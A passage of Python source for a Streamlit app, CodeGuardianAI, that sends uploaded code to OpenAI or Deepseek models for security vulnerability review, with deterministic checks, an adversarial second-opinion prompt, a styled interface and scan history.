        "## [Secure] No Vulnerabilities Detected\n"
        "Then justify your conclusion.\n\n"
        "PHP CODE TO ANALYZE:\n"
        "```php\n"
        f"{code}\n"
        "```\n\n"
        "Start your response with '## Security Analysis Results' and list each vulnerability with its severity."
    )

    try:
        # ── Step 1: Always run deterministic checks first ─────────────────────
        deterministic = verify_php_security(code)

        # ── Step 2: AI analysis ───────────────────────────────────────────────
        messages = [
            {"role": "system", "content": "You are an expert PHP security auditor focusing exclusively on finding security vulnerabilities."},
            {"role": "user", "content": security_prompt}
        ]

        logging.info("Performing targeted PHP security analysis...")
        response = client.create_completion(messages=messages, temperature=0.1, max_tokens=3000)
        security_analysis = response.choices[0].message.content

        appears_secure = (
            "secure" in security_analysis.lower()
            and not any(w in security_analysis.lower() for w in [
                "vulnerability", "vulnerabilities", "insecure", "risk", "exploit"
            ])
        )

        # ── Step 3: Merge deterministic + AI results ──────────────────────────
        if appears_secure:
            if deterministic:
                # AI missed real issues — lead with deterministic findings
                final_analysis = (
                    deterministic
                    + "\n\n---\n\n### AI Analysis (Missed Issues Above)\n\n"
                    + security_analysis
                )
            else:
                # Neither deterministic nor AI found anything — get adversarial second opinion
                challenge_prompt = (
                    "You are a professional penetration tester who specializes in finding vulnerabilities that other auditors miss.\n"
                    "The following PHP code was marked 'secure' by another auditor. Find what they overlooked.\n\n"
                    "Look carefully for:\n"
                    "1. Subtle XSS (especially in error/success messages)\n"
                    "2. Indirect file inclusion risks\n"
                    "3. Race conditions\n"
                    "4. Insufficient validation of user input\n"
                    "5. Logic flaws that lead to security bypasses\n"
                    "6. Insecure configuration or implementation patterns\n"
                    "7. Insecure direct object references\n"
                    "8. Violated PHP security best practices\n\n"
                    "CODE TO ANALYZE:\n"
                    "```php\n"
                    f"{code}\n"
                    "```\n\n"
                    "If you find vulnerabilities, use '## VULNERABILITY DETECTED' headers.\n"
                    "If you agree the code is secure, respond with: ## [Secure] Code Verified Secure"
                )
                messages = [
                    {"role": "system", "content": "You are an adversarial security researcher who specializes in finding vulnerabilities other auditors miss."},
                    {"role": "user", "content": challenge_prompt}
                ]
                logging.info("Getting second opinion for PHP security analysis...")
                response2 = client.create_completion(messages=messages, temperature=0.2, max_tokens=3000)
                second_opinion = response2.choices[0].message.content

                if "vulnerability detected" in second_opinion.lower() or "insecure" in second_opinion.lower():
                    final_analysis = (
                        "## Security Analysis Results (Second Opinion)\n\n"
                        "A deeper review identified potential vulnerabilities initially overlooked:\n\n"
                        f"{second_opinion}\n\n"
                        "### Initial Analysis (Incomplete)\n\n"
                        f"{security_analysis}"
                    )
                else:
                    final_analysis = (
                        "## [Secure] Code Appears Secure After Multiple Reviews\n\n"
                        "Two separate security analyses found no significant vulnerabilities.\n\n"
                        f"{security_analysis}"
                    )
        else:
            # AI found vulnerabilities
            if deterministic:
                # Prepend deterministic findings so they are never buried
                final_analysis = (
                    deterministic
                    + "\n\n---\n\n### AI Analysis\n\n"
                    + security_analysis
                )
            else:
                final_analysis = security_analysis

        return {
            "status": "success",
            "analysis": final_analysis,
            "metadata": {
                "timestamp": datetime.now().isoformat(),
                "api": api_type,
                "multiple_analyses": appears_secure,
            }
        }

    except Exception as e:
        logging.error(f"PHP security analysis error: {str(e)}")
        return {
            "status": "error",
            "message": "PHP security analysis failed. Please check your API key and try again."
        }


def process_single_file(uploaded_file) -> bool:
    """Process a single uploaded file."""
    try:
        file_content = uploaded_file.getvalue().decode("utf-8")
        if len(file_content) > 100 * 1024:
            st.error("File is too large. Please upload a file smaller than 100KB.")
            return False
        st.session_state.user_code = file_content
        st.session_state.current_file = uploaded_file.name
        st.success("Code uploaded successfully!")
        with st.expander("View Uploaded Code"):
            ext = uploaded_file.name.rsplit('.', 1)[-1]
            st.code(st.session_state.user_code, language=ext)
        return True
    except Exception as e:
        logging.error(f"File read error: {str(e)}")
        st.error("Error reading file. Please ensure the file is valid UTF-8 text.")
        return False


def process_uploaded_folder(uploaded_zip):
    """Process a zipped folder of code files with metadata tracking."""
    folder_contents = {}
    file_metadata = {}
    with zipfile.ZipFile(io.BytesIO(uploaded_zip.read())) as z:
        for filename in z.namelist():
            if filename.endswith(('.php', '.py', '.js', '.java', '.cpp', '.cs')):
                with z.open(filename) as f:
                    content = f.read().decode('utf-8')
                    size_kb = len(content) / 1024
                    file_metadata[filename] = {
                        'size_kb': round(size_kb, 2),
                        'lines': len(content.splitlines()),
                        'extension': filename.rsplit('.', 1)[-1],
                        'scanned': False,
                        'last_scan': None
                    }
                    if size_kb <= 100:
                        folder_contents[filename] = content
                    else:
                        st.warning(f"Skipped {filename}: File size exceeds 100KB limit")

    if folder_contents:
        st.session_state.folder_contents = folder_contents
        st.session_state.file_metadata = file_metadata
        st.success(f"Loaded {len(folder_contents)} valid files.")
    else:
        st.error("No valid code files found.")

    return folder_contents, file_metadata


def enhance_streamlit_ui():
    """Inject professional CSS into the Streamlit app."""
    st.markdown("""
    <style>
    /* ── Google Font ── */
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    /* ── Design tokens ── */
    :root {
        --bg:          #0d1117;
        --surface:     #161b22;
        --surface-2:   #21262d;
        --border:      #30363d;
        --border-soft: #21262d;
        --text:        #e6edf3;
        --text-muted:  #8b949e;
        --accent:      #1f6feb;
        --accent-soft: rgba(31,111,235,0.15);
        --green:       #238636;
        --green-soft:  rgba(35,134,54,0.15);
        --amber:       #d29922;
        --amber-soft:  rgba(210,153,34,0.15);
        --red:         #da3633;
        --red-soft:    rgba(218,54,51,0.15);
        --orange:      #e3702a;
        --orange-soft: rgba(227,112,42,0.15);
        --radius:      10px;
        --shadow:      0 4px 24px rgba(0,0,0,0.4);
        --transition:  0.2s ease;
    }

    /* ── Base ── */
    html, body, [class*="css"], .stApp {
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif !important;
        background-color: var(--bg) !important;
        color: var(--text) !important;
    }

    /* ── Hide Streamlit chrome ── */
    #MainMenu, footer, header { visibility: hidden; }
    .block-container { padding-top: 1.5rem !important; max-width: 1200px !important; }

    /* ── Sidebar ── */
    section[data-testid="stSidebar"] {
        background-color: var(--surface) !important;
        border-right: 1px solid var(--border) !important;
    }
    section[data-testid="stSidebar"] * { color: var(--text) !important; }
    section[data-testid="stSidebar"] .stSelectbox label,
    section[data-testid="stSidebar"] .stRadio label,
    section[data-testid="stSidebar"] .stCheckbox label { color: var(--text-muted) !important; font-size: 0.82rem !important; text-transform: uppercase !important; letter-spacing: 0.05em !important; }
    section[data-testid="stSidebar"] [data-baseweb="select"] > div { background: var(--surface-2) !important; border-color: var(--border) !important; color: var(--text) !important; }
    .sidebar-logo { text-align: center; padding: 1.2rem 0 0.5rem; }
    .sidebar-logo-text { font-size: 1.1rem; font-weight: 700; color: var(--text) !important; letter-spacing: 0.02em; }
    .sidebar-logo-sub { font-size: 0.72rem; color: var(--text-muted) !important; text-transform: uppercase; letter-spacing: 0.1em; margin-top: 2px; }
    .sidebar-divider { border: none; border-top: 1px solid var(--border); margin: 0.8rem 0; }
    .sidebar-section-label {
        font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em;
        color: var(--text-muted) !important; font-weight: 600; padding: 0.6rem 0 0.3rem;
    }

    /* ── Status pill ── */
    .status-pill {
        display: inline-flex; align-items: center; gap: 6px;
        padding: 3px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 600;
        margin: 2px 0;
    }
    .status-online  { background: var(--green-soft);  color: #3fb950 !important; border: 1px solid rgba(63,185,80,0.3); }
    .status-offline { background: var(--red-soft);    color: #f85149 !important; border: 1px solid rgba(248,81,73,0.3); }
    .status-dot { width: 7px; height: 7px; border-radius: 50%; background: currentColor; }

    /* ── Hero header ── */
    .hero {
        background: linear-gradient(135deg, #0d1117 0%, #161b22 40%, #0d2040 100%);
        border: 1px solid var(--border);
        border-radius: var(--radius);
        padding: 2.5rem 2rem;
        text-align: center;
        margin-bottom: 1.8rem;
        position: relative;
        overflow: hidden;
    }
    .hero::before {
        content: '';
        position: absolute; inset: 0;
        background: radial-gradient(ellipse at 50% 0%, rgba(31,111,235,0.15) 0%, transparent 70%);
        pointer-events: none;
    }
    .hero-badge {
        display: inline-block;
        background: var(--accent-soft); color: #58a6ff !important;
        border: 1px solid rgba(88,166,255,0.3);
        border-radius: 20px; font-size: 0.72rem; font-weight: 600;
        padding: 3px 12px; letter-spacing: 0.08em; text-transform: uppercase;
        margin-bottom: 0.8rem;
    }
    .hero-title {
        font-size: 2.4rem !important; font-weight: 700 !important;
        color: var(--text) !important; margin: 0.3rem 0 !important;
        letter-spacing: -0.03em !important; line-height: 1.15 !important;
    }
    .hero-title span { color: #58a6ff !important; }
    .hero-subtitle {
        font-size: 1rem; color: var(--text-muted) !important;
        max-width: 560px; margin: 0.5rem auto 0; line-height: 1.6;
    }
    .hero-logo { width: 72px; height: 72px; border-radius: 16px; margin-bottom: 0.8rem; object-fit: contain; }

    /* ── Info cards ── */
    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.5rem; }
    .info-card {
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: var(--radius);
        padding: 1.3rem 1.4rem;
    }
    .info-card-title { font-size: 0.82rem; font-weight: 600; color: var(--text-muted) !important; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 0.8rem; display: flex; align-items: center; gap: 6px; }
    .info-row { display: flex; align-items: center; gap: 8px; padding: 4px 0; font-size: 0.87rem; color: var(--text) !important; }
    .info-check { color: #3fb950 !important; font-weight: 700; }

    /* ── Severity badges ── */
    .sev-badge {
        display: inline-flex; align-items: center; gap: 5px;
        padding: 4px 12px; border-radius: 6px; font-size: 0.8rem; font-weight: 600;
        margin: 3px 2px;
    }
    .sev-critical { background: var(--red-soft);    color: #f85149 !important; border: 1px solid rgba(248,81,73,0.3); }
    .sev-high     { background: var(--orange-soft); color: #ffa657 !important; border: 1px solid rgba(255,166,87,0.3); }
    .sev-medium   { background: var(--amber-soft);  color: #d29922 !important; border: 1px solid rgba(210,153,34,0.3); }
    .sev-low      { background: var(--green-soft);  color: #3fb950 !important; border: 1px solid rgba(63,185,80,0.3); }

    /* ── Results panel ── */
    .results-header {
        display: flex; align-items: center; justify-content: space-between;
        padding: 1rem 1.4rem;
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: var(--radius) var(--radius) 0 0;
        margin-top: 1.2rem;
    }
    .results-title { font-size: 0.95rem; font-weight: 700; color: var(--text) !important; display: flex; align-items: center; gap: 8px; }
    .results-body {
        background: var(--surface);
        border: 1px solid var(--border); border-top: none;
        border-radius: 0 0 var(--radius) var(--radius);
        padding: 1.4rem;
    }

    /* ── Alert banners ── */
    .alert {
        display: flex; align-items: flex-start; gap: 10px;
        padding: 0.85rem 1.1rem; border-radius: 8px;
        font-size: 0.87rem; margin-bottom: 0.8rem; line-height: 1.5;
    }
    .alert-icon { font-size: 1rem; flex-shrink: 0; margin-top: 1px; }
    .alert-success { background: var(--green-soft);  color: #3fb950 !important; border: 1px solid rgba(63,185,80,0.3); }
    .alert-warning { background: var(--amber-soft);  color: #d29922 !important; border: 1px solid rgba(210,153,34,0.3); }
    .alert-info    { background: var(--accent-soft); color: #58a6ff !important; border: 1px solid rgba(88,166,255,0.3); }

    /* ── File table ── */
    .file-table-header {
        display: grid; grid-template-columns: 3fr 1fr 1fr;
        padding: 0.5rem 1rem; font-size: 0.72rem; font-weight: 600;
        text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted) !important;
        border-bottom: 1px solid var(--border);
    }
    .file-row {
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: 8px; margin: 4px 0; padding: 0.7rem 1rem;
        transition: border-color var(--transition);
    }
    .file-row:hover { border-color: var(--accent); }
    .file-name { font-weight: 600; font-size: 0.88rem; color: var(--text) !important; }
    .file-meta { font-size: 0.75rem; color: var(--text-muted) !important; margin-top: 1px; }

    /* ── Scan history ── */
    .history-item {
        background: var(--surface-2);
        border: 1px solid var(--border-soft);
        border-radius: 8px; padding: 0.8rem 1rem; margin: 6px 0; font-size: 0.84rem;
    }
    .history-meta { color: var(--text-muted) !important; font-size: 0.75rem; }

    /* ── Streamlit widget overrides ── */
    .stTextInput > div > div { background: var(--surface-2) !important; border-color: var(--border) !important; color: var(--text) !important; border-radius: 8px !important; }
    .stTextInput > div > div:focus-within { border-color: var(--accent) !important; box-shadow: 0 0 0 3px var(--accent-soft) !important; }
    .stButton > button {
        background: var(--accent) !important; color: #fff !important;
        border: none !important; border-radius: 8px !important;
        padding: 0.5rem 1.4rem !important; font-weight: 600 !important; font-size: 0.87rem !important;
        transition: all var(--transition) !important; letter-spacing: 0.01em !important;
    }
    .stButton > button:hover { background: #388bfd !important; box-shadow: 0 0 0 3px var(--accent-soft) !important; transform: translateY(-1px) !important; }
    .stButton > button:active { transform: translateY(0) !important; }
    .stDownloadButton > button {
        background: var(--surface-2) !important; color: var(--text) !important;
        border: 1px solid var(--border) !important; border-radius: 8px !important;
        padding: 0.45rem 1.2rem !important; font-weight: 500 !important; font-size: 0.84rem !important;
        transition: all var(--transition) !important;
    }
    .stDownloadButton > button:hover { border-color: var(--accent) !important; color: #58a6ff !important; }
    .stSelectbox [data-baseweb="select"] > div, .stRadio > div, .stCheckbox > label { color: var(--text) !important; }
    div[data-testid="stExpander"] { background: var(--surface) !important; border: 1px solid var(--border) !important; border-radius: 8px !important; }
    div[data-testid="stExpander"] summary { color: var(--text) !important; }
    .stSpinner > div { border-color: var(--accent) transparent transparent transparent !important; }
    div[data-testid="stMarkdownContainer"] p,
    div[data-testid="stMarkdownContainer"] li { color: var(--text) !important; }
    div[data-testid="stMarkdownContainer"] h1,
    div[data-testid="stMarkdownContainer"] h2,
    div[data-testid="stMarkdownContainer"] h3 { color: var(--text) !important; }
    div[data-testid="stMarkdownContainer"] code { background: var(--surface-2) !important; color: #79c0ff !important; border-radius: 4px !important; padding: 1px 5px !important; }
    div[data-testid="stMarkdownContainer"] pre { background: var(--surface-2) !important; border: 1px solid var(--border) !important; border-radius: 8px !important; }
    .stAlert { border-radius: 8px !important; }
    .stCodeBlock { border-radius: 8px !important; }
    div[data-testid="stFileUploader"] { background: var(--surface) !important; border: 1px dashed var(--border) !important; border-radius: var(--radius) !important; }
    div[data-testid="stFileUploader"]:hover { border-color: var(--accent) !important; }
    div[data-testid="stFileUploader"] * { color: var(--text) !important; }
    .stSlider [data-testid="stThumbValue"] { background: var(--accent) !important; }

    /* ── Login screen ── */
    .login-wrap {
        max-width: 400px; margin: 6rem auto; text-align: center;
    }
    .login-card {
        background: var(--surface); border: 1px solid var(--border);
        border-radius: 16px; padding: 2.5rem 2rem;
        box-shadow: var(--shadow);
    }
    .login-icon { font-size: 2.5rem; margin-bottom: 0.5rem; }
    .login-title { font-size: 1.4rem; font-weight: 700; color: var(--text) !important; margin-bottom: 0.3rem; }
    .login-sub { font-size: 0.85rem; color: var(--text-muted) !important; margin-bottom: 1.5rem; }

    /* ── Scrollbar ── */
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: var(--bg); }
    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
    ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
    </style>
    """, unsafe_allow_html=True)


def initialize_session_state():
    """Initialize all session state variables with defaults."""
    defaults = {
        "messages": [],
        "user_code": "",
        "analysis_cache": {},
        "last_analysis_time": None,
        "connection_status": None,
        "folder_contents": {},
        "file_metadata": {},
        "selected_api": "OpenAI",
        "current_file": None,
        "scan_history": {},
        "confidence_level": "Medium",
        "verify_vulnerabilities": True,
    }
    for key, value in defaults.items():
        if key not in st.session_state:
            st.session_state[key] = value


def get_base64_img(image_path: str) -> str:
    with open(image_path, "rb") as img_file:
        return base64.b64encode(img_file.read()).decode()


def format_user_friendly_results(analysis_results: str):
    """Display contextual banner then full analysis markdown."""
    if "Original Analysis (Not Verified)" in analysis_results:
        m = re.search(r"identified (\d+) potential issues", analysis_results)
        count = m.group(1) if m else "some"
        st.markdown(f"""
            <div class="alert alert-warning">
                <span class="alert-icon">⚠️</span>
                <div>
                    <strong>{count} potential issues found — none passed verification</strong><br>
                    Lower the confidence threshold in the sidebar to "Low" to review them.
                </div>
            </div>
        """, unsafe_allow_html=True)
    elif "[Secure]" in analysis_results and "Vulnerability #" not in analysis_results:
        st.markdown("""
            <div class="alert alert-success">
                <span class="alert-icon">✅</span>
                <div><strong>No vulnerabilities detected</strong> — your code appears secure.</div>
            </div>
        """, unsafe_allow_html=True)
    elif "Vulnerability #" in analysis_results:
        vulns = extract_vulnerabilities(analysis_results)
        critical = sum(1 for v in vulns if v["severity"] == "Critical")
        high     = sum(1 for v in vulns if v["severity"] == "High")
        medium   = sum(1 for v in vulns if v["severity"] == "Medium")
        low      = sum(1 for v in vulns if v["severity"] == "Low")
        badge = lambda cls, label: f'<span class="sev-badge sev-{cls.lower()}">{label}</span>'
        counts = " ".join([
            badge("critical", f"● {critical} Critical") if critical else "",
            badge("high",     f"● {high} High")         if high     else "",
            badge("medium",   f"● {medium} Medium")     if medium   else "",
            badge("low",      f"● {low} Low")           if low      else "",
        ])
        st.markdown(f"""
            <div class="alert alert-warning">
                <span class="alert-icon">🔍</span>
                <div>
                    <strong>{len(vulns)} verified finding{"s" if len(vulns) != 1 else ""}</strong>
                    &nbsp;{counts}
                </div>
            </div>
        """, unsafe_allow_html=True)

    st.markdown(
        '<div class="results-body">',
        unsafe_allow_html=True,
    )
    st.markdown(analysis_results)
    st.markdown("</div>", unsafe_allow_html=True)


def run_analysis(code: str, query: str, filename: str, analyzer: SecurityAnalyzer):
    """Run analysis and optionally verify results. Returns the final analysis string or None on error."""
    result = analyzer.analyze_code(code, query, st.session_state.selected_api.lower(), filename=filename)

    if result["status"] != "success":
        st.markdown(f"""
            <div class="alert alert-warning">
                <span class="alert-icon">❌</span>
                <div><strong>Analysis failed</strong><br>{result['message']}</div>
            </div>
        """, unsafe_allow_html=True)
        return None

    analysis_results = result["analysis"]

    if st.session_state.verify_vulnerabilities:
        with st.spinner("Verifying results to reduce false positives..."):
            analysis_results = verify_all_vulnerabilities(
                analysis_results,
                st.session_state.selected_api.lower(),
                st.session_state.confidence_level
            )

    return analysis_results


def display_results(analysis_results: str, file_key: str):
    """Store scan in history and display results with export buttons."""
    if file_key not in st.session_state.scan_history:
        st.session_state.scan_history[file_key] = []

    st.session_state.scan_history[file_key].append({
        'timestamp': datetime.now().isoformat(),
        'analysis': analysis_results,
        'api': st.session_state.selected_api,
        'confidence_level': st.session_state.confidence_level,
        'verification_used': st.session_state.verify_vulnerabilities,
    })

    ts = datetime.now().strftime("%H:%M:%S")
    api_lbl = st.session_state.selected_api
    conf_lbl = st.session_state.confidence_level
    st.markdown(f"""
        <div class="results-header">
            <div class="results-title">
                🔐 Security Analysis Report
            </div>
            <div style="font-size:0.75rem;color:var(--text-muted);">
                {ts} &nbsp;·&nbsp; {api_lbl} &nbsp;·&nbsp; Confidence: {conf_lbl}
            </div>
        </div>
    """, unsafe_allow_html=True)

    format_user_friendly_results(analysis_results)
    generate_download_report(analysis_results)

    history = st.session_state.scan_history[file_key]
    if len(history) > 1:
        with st.expander(f"Scan history ({len(history)} scans)"):
            for idx, scan in enumerate(reversed(history)):
                verified = "✓ verified" if scan.get('verification_used') else "unverified"
                st.markdown(f"""
                    <div class="history-item">
                        <strong>Scan {len(history) - idx}</strong>
                        <span class="history-meta"> · {scan['timestamp'][:19].replace('T',' ')} · {scan['api']} · {scan.get('confidence_level','—')} · {verified}</span>
                    </div>
                """, unsafe_allow_html=True)
                if st.button("View", key=f"hist_{file_key}_{idx}"):
                    st.markdown(scan['analysis'])


def _render_sidebar(analyzer: SecurityAnalyzer):
    """Render the full sidebar: branding, status, settings, upload."""
    with st.sidebar:
        # ── Brand ──────────────────────────────────────────────────────────
        try:
            img_b64 = get_base64_img("logo.png")
            st.markdown(f"""
                <div class="sidebar-logo">
                    <img src="data:image/png;base64,{img_b64}" width="54" style="border-radius:12px;margin-bottom:6px;">
                    <div class="sidebar-logo-text">CodeGuardianAI</div>
                    <div class="sidebar-logo-sub">Security Analysis Platform</div>
                </div>""", unsafe_allow_html=True)
        except Exception:
            st.markdown("""
                <div class="sidebar-logo">
                    <div style="font-size:2rem;">🛡️</div>
                    <div class="sidebar-logo-text">CodeGuardianAI</div>
                    <div class="sidebar-logo-sub">Security Analysis Platform</div>
                </div>""", unsafe_allow_html=True)

        st.markdown('<hr class="sidebar-divider">', unsafe_allow_html=True)

        # ── Connection status ───────────────────────────────────────────────
        if st.session_state.connection_status is None:
            with st.spinner("Checking connection…"):
                has_internet = check_internet_connection()
                can_reach_api = True
                try:
                    socket.gethostbyname('api.openai.com')
                except socket.gaierror:
                    can_reach_api = False
                st.session_state.connection_status = {
                    'internet': has_internet, 'api': can_reach_api
                }

        conn = st.session_state.connection_status
        net_cls  = "status-online"  if conn['internet'] else "status-offline"
        api_cls  = "status-online"  if conn['api']      else "status-offline"
        net_lbl  = "Internet: Connected"    if conn['internet'] else "Internet: Offline"
        api_lbl  = "API: Reachable"         if conn['api']      else "API: Unreachable"
        st.markdown(f"""
            <div style="padding:0 0 0.4rem;">
                <div class="status-pill {net_cls}"><span class="status-dot"></span>{net_lbl}</div><br>
                <div class="status-pill {api_cls}"><span class="status-dot"></span>{api_lbl}</div>
            </div>""", unsafe_allow_html=True)

        st.markdown('<hr class="sidebar-divider">', unsafe_allow_html=True)

        # ── API provider ────────────────────────────────────────────────────
        st.markdown('<div class="sidebar-section-label">AI Provider</div>', unsafe_allow_html=True)
        api_choice = st.selectbox(
            "API Provider",
            ["OpenAI", "Deepseek"],
            label_visibility="collapsed",
            help="Select which AI provider to use for analysis",
        )
        st.session_state.selected_api = api_choice

        st.markdown('<hr class="sidebar-divider">', unsafe_allow_html=True)

        # ── Analysis settings ───────────────────────────────────────────────
        st.markdown('<div class="sidebar-section-label">Analysis Settings</div>', unsafe_allow_html=True)

        confidence_level = st.select_slider(
            "Confidence Threshold",
            options=["Low", "Medium", "High"],
            value=st.session_state.confidence_level,
            help="Higher = fewer false positives, but might miss subtle issues",
        )
        st.session_state.confidence_level = confidence_level

        verify_toggle = st.checkbox(
            "Verify findings (batch)",
            value=st.session_state.verify_vulnerabilities,
            help="Runs a second-pass verification in a single API call to reduce false positives.",
        )
        st.session_state.verify_vulnerabilities = verify_toggle

        with st.expander("Confidence level guide"):
            st.markdown("""
            - **Low** — Shows all potential issues; may include false positives
            - **Medium** — Balanced; filters low-confidence findings
            - **High** — Only highly confident findings; minimises noise
            """)

        st.markdown('<hr class="sidebar-divider">', unsafe_allow_html=True)

        # ── Upload ──────────────────────────────────────────────────────────
        st.markdown('<div class="sidebar-section-label">Upload Code</div>', unsafe_allow_html=True)

        upload_type = st.radio(
            "Upload type",
            ["Single File", "Directory (ZIP)"],
            label_visibility="collapsed",
        )

        if upload_type == "Single File":
            uploaded_file = st.file_uploader(
                "Drop a file here",
                type=["php", "txt", "py", "js", "java", "cpp", "cs"],
                help="Max 100 KB",
                label_visibility="collapsed",
            )
            if uploaded_file:
                process_single_file(uploaded_file)
        else:
            uploaded_folder = st.file_uploader(
                "Drop a ZIP here",
                type="zip",
                help="Upload a zipped directory of code files",
                label_visibility="collapsed",
            )
            if uploaded_folder:
                folder_contents, file_metadata = process_uploaded_folder(uploaded_folder)
                if folder_contents:
                    st.markdown('<div class="sidebar-section-label" style="margin-top:0.6rem;">Loaded Files</div>', unsafe_allow_html=True)
                    for fname, meta in file_metadata.items():
                        st.caption(f"📄 {fname} — {meta['size_kb']} KB")


def _render_analysis_panel(analyzer: SecurityAnalyzer, code: str, filename: str):
    """Render the scan-type picker, run analysis, and display results."""
    with st.expander(f"📄 View source — {filename}", expanded=False):
        ext = filename.rsplit('.', 1)[-1] if '.' in filename else 'text'
        st.code(code, language=ext)

    analysis_type = st.radio(
        "Scan mode",
        ["Full Security Scan", "Custom Query"],
        horizontal=True,
    )
    query = (
        st.text_input("Describe what to focus on…", placeholder="e.g. Check for SQL injection in the login flow")
        if analysis_type == "Custom Query"
        else "Perform a complete security analysis of the code."
    )

    if not query:
        return

    with st.spinner(f"Scanning with {st.session_state.selected_api}…"):
        analysis_results = run_analysis(code, query, filename, analyzer)

    if analysis_results:
        if (st.session_state.current_file and
                st.session_state.current_file in st.session_state.file_metadata):
            st.session_state.file_metadata[st.session_state.current_file]['scanned'] = True
            st.session_state.file_metadata[st.session_state.current_file]['last_scan'] = (
                datetime.now().strftime("%Y-%m-%d %H:%M")
            )
        display_results(analysis_results, filename)


def main():
    st.set_page_config(
        page_title="CodeGuardianAI",
        page_icon="🛡️",
        layout="wide",
        initial_sidebar_state="expanded",
        menu_items={'Get Help': None, 'Report a bug': None, 'About': None},
    )

    initialize_session_state()
    if not check_password():
        st.stop()

    enhance_streamlit_ui()
    analyzer = SecurityAnalyzer()
    _render_sidebar(analyzer)

    # ── Hero ────────────────────────────────────────────────────────────────
    try:
        img_b64 = get_base64_img("logo.png")
        logo_html = f'<img src="data:image/png;base64,{img_b64}" class="hero-logo">'
    except Exception:
        logo_html = '<div style="font-size:3rem;margin-bottom:0.5rem;">🛡️</div>'

    st.markdown(f"""
        <div class="hero">
            {logo_html}
            <div class="hero-badge">AI-Powered · Multi-Language · v2.1</div>
            <h1 class="hero-title">Code<span>Guardian</span>AI</h1>
            <p class="hero-subtitle">
                Automated security vulnerability analysis powered by OpenAI and Deepseek.
                Upload your code and get a detailed, actionable security report in seconds.
            </p>
        </div>
    """, unsafe_allow_html=True)

    # ── Info cards ──────────────────────────────────────────────────────────
    st.markdown("""
        <div class="info-grid">
            <div class="info-card">
                <div class="info-card-title">🔍 What this tool does</div>
                <div class="info-row"><span class="info-check">✓</span> Scans every line for security vulnerabilities</div>
                <div class="info-row"><span class="info-check">✓</span> Pinpoints exact locations with code snippets</div>
                <div class="info-row"><span class="info-check">✓</span> Provides CWE / OWASP classification</div>
                <div class="info-row"><span class="info-check">✓</span> Gives minimal, actionable fix suggestions</div>
                <div class="info-row"><span class="info-check">✓</span> Batch-verifies findings to cut false positives</div>
            </div>
            <div class="info-card">
                <div class="info-card-title">⚠️ Severity levels</div>
                <div class="info-row"><span class="sev-badge sev-critical">● Critical</span> Direct system compromise — fix now</div>
                <div class="info-row"><span class="sev-badge sev-high">● High</span> Significant impact — fix soon</div>
                <div class="info-row"><span class="sev-badge sev-medium">● Medium</span> Moderate impact — plan to address</div>
                <div class="info-row"><span class="sev-badge sev-low">● Low</span> Limited impact — fix when possible</div>
            </div>
        </div>
    """, unsafe_allow_html=True)

    # ── Main content ────────────────────────────────────────────────────────
    if st.session_state.folder_contents:
        st.markdown("""
            <div style="font-size:0.72rem;font-weight:600;text-transform:uppercase;
                        letter-spacing:0.08em;color:var(--text-muted);margin-bottom:0.6rem;">
                Project Files
            </div>
        """, unsafe_allow_html=True)

        st.markdown("""
            <div class="file-table-header">
                <span>File</span><span>Status</span><span>Action</span>
            </div>
        """, unsafe_allow_html=True)

        for filename, content in st.session_state.folder_contents.items():
            metadata = st.session_state.file_metadata[filename]
            status_html = (
                '<span class="sev-badge sev-low">✓ Scanned</span>'
                if metadata['scanned']
                else '<span class="sev-badge sev-medium">Pending</span>'
            )
            st.markdown(f"""
                <div class="file-row" style="display:grid;grid-template-columns:3fr 1fr 1fr;align-items:center;">
                    <div>
                        <div class="file-name">📄 {filename}</div>
                        <div class="file-meta">{metadata['size_kb']} KB · {metadata['lines']} lines · .{metadata['extension']}</div>
                    </div>
                    <div>{status_html}</div>
                </div>
            """, unsafe_allow_html=True)
            if st.button("Analyze →", key=f"analyze_{filename}"):
                st.session_state.current_file = filename
                st.session_state.user_code = content
                metadata['scanned'] = True
                metadata['last_scan'] = datetime.now().strftime("%Y-%m-%d %H:%M")
                st.rerun()

        if st.session_state.current_file and st.session_state.user_code:
            st.markdown("---")
            st.markdown(f"#### Analyzing: `{st.session_state.current_file}`")
            _render_analysis_panel(
                analyzer,
                st.session_state.user_code,
                st.session_state.current_file,
            )

    elif st.session_state.user_code:
        file_key = st.session_state.current_file or "uploaded_file"
        _render_analysis_panel(analyzer, st.session_state.user_code, file_key)

    else:
        st.markdown("""
            <div style="text-align:center;padding:4rem 2rem;color:var(--text-muted);">
                <div style="font-size:3rem;margin-bottom:1rem;">📂</div>
                <div style="font-size:1.1rem;font-weight:600;margin-bottom:0.4rem;">No code loaded yet</div>
                <div style="font-size:0.88rem;">Upload a file or ZIP archive using the sidebar to begin analysis.</div>
            </div>
        """, unsafe_allow_html=True)


if __name__ == "__main__":
    main()
